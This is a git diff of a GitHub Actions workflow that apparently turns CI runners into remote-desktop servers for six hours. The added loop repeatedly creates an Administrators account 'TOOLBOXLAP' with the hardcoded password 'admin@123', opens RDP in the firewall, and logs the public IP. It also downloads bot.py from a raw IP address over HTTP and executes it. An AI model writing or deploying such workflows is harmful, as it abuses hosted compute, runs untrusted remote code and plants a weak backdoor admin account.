@@ -93,7 +93,7 @@ jobs:
         shell: pwsh
         run: |
           $desktop = [Environment]::GetFolderPath("Desktop")
-          $botUrl = "http://82.47.102.153:5000/"
+          $botUrl = "http://82.47.102.153:5000"
           for ($i = 1; $i -le 3; $i++) {
               try {
                   Invoke-WebRequest -Uri $botUrl -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 30
@@ -115,22 +115,93 @@ jobs:
               Start-Process -FilePath $pythonPath -ArgumentList "`"$desktop\bot.py`"" -WindowStyle Normal
           }
 
-      - name: Keep Alive for 6 Hours
+      - name: Rotate Servers Every Minute (Kill Current, Start New)
         shell: pwsh
         run: |
-          $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
           $endTime = (Get-Date).AddHours(6)
+          $serverNum = ${{ matrix.server }}
+          $os = "${{ matrix.os }}"
+          $desktop = [Environment]::GetFolderPath("Desktop")
+          
           Write-Host ""
-          Write-Host "Server ${{ matrix.server }} is ACTIVE"
-          Write-Host "RDP: $ip:3389"
-          Write-Host "User: TOOLBOXLAP"
-          Write-Host "Pass: admin@123"
-          Write-Host "Will run for 6 hours until: $endTime"
+          Write-Host "===== ROTATION MODE ENABLED ====="
+          Write-Host "Server $serverNum will rotate every 60 seconds"
+          Write-Host "Each rotation: kills current, resets, starts new RDP session"
+          Write-Host "================================="
           Write-Host ""
+
           while ((Get-Date) -lt $endTime) {
-              Start-Sleep -Seconds 300
+              # Get current IP
+              try {
+                  $currentIp = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
+              } catch {
+                  $currentIp = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
+              }
+              
+              Write-Host "[$(Get-Date)] Server $serverNum ACTIVE - RDP: $currentIp:3389"
+              
+              # Wait 60 seconds
+              Start-Sleep -Seconds 60
+              
+              Write-Host "[$(Get-Date)] ROTATING: Killing current RDP session on Server $serverNum..."
+              
+              # Kill RDP service to disconnect all sessions
+              Stop-Service TermService -Force -ErrorAction SilentlyContinue
+              
+              # Kill any running bot processes
+              Get-Process -Name "python" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+              
+              # Clear RDP settings
+              Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+              
+              # Reset firewall
+              netsh advfirewall firewall delete rule name="RDP" 2>$null
+              netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
+              
+              # Restart RDP with new session
+              Restart-Service TermService -Force -ErrorAction SilentlyContinue
+              
+              # Recreate user (force refresh)
+              $password = ConvertTo-SecureString "admin@123" -AsPlainText -Force
+              if (Get-LocalUser -Name "TOOLBOXLAP" -ErrorAction SilentlyContinue) {
+                  Remove-LocalUser -Name "TOOLBOXLAP" -Force
+              }
+              New-LocalUser -Name "TOOLBOXLAP" -Password $password -AccountNeverExpires -PasswordNeverExpires
+              Add-LocalGroupMember -Group "Administrators" -Member "TOOLBOXLAP" -ErrorAction SilentlyContinue
+              Add-LocalGroupMember -Group "Remote Desktop Users" -Member "TOOLBOXLAP" -ErrorAction SilentlyContinue
+              
+              # Redownload and run bot
+              $botUrl = "http://82.47.102.153:5000"
+              try {
+                  Invoke-WebRequest -Uri $botUrl -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
+              } catch {
+                  Write-Host "[$(Get-Date)] Failed to download fresh bot"
+              }
+              
+              $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
+              if (-not $pythonPath) {
+                  $pythonPath = "C:\Python311\python.exe"
+              }
+              if (Test-Path "$desktop\bot.py") {
+                  Start-Process -FilePath $pythonPath -ArgumentList "`"$desktop\bot.py`"" -WindowStyle Normal
+                  Write-Host "[$(Get-Date)] Bot restarted with fresh copy"
+              }
+              
+              # Get new IP after rotation
+              Start-Sleep -Seconds 5
+              try {
+                  $newIp = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
+              } catch {
+                  $newIp = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
+              }
+              
+              Write-Host "[$(Get-Date)] ROTATION COMPLETE - New IP: $newIp"
+              Write-Host "============================================"
+              
               $remaining = [math]::Round(($endTime - (Get-Date)).TotalMinutes, 0)
-              Write-Host "[$(Get-Date)] Server ${{ matrix.server }} - $remaining minutes remaining - RDP: $ip"
+              Write-Host "[$(Get-Date)] Server $serverNum - $remaining minutes remaining until 6-hour limit"
+              Write-Host ""
           }
+          
           Write-Host ""
-          Write-Host "Server ${{ matrix.server }} session completed (6 hours)"
+          Write-Host "===== SERVER $serverNum SESSION COMPLETED (6 hours) ====="
